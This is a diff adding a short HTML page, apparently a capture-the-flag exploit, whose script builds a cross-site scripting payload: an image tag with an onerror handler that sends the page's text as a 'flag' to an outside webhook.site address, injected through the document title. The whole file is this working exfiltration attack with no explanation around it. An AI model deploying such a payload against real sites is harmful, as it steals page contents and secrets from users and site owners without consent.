@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Get the SECRET!!!</title>
+</head>
+<body>
+    <script>
+        const webhookUrl = "https://webhook.site/dc4c9e36-04e0-46c0-98df-a631edc844c3";
+        const payload = `<img src="x" onerror="fetch('${webhookUrl}/?flag=' + document.body.innerText)">`;
+        document.title = payload;
+    </script>
+</body>
+</html>
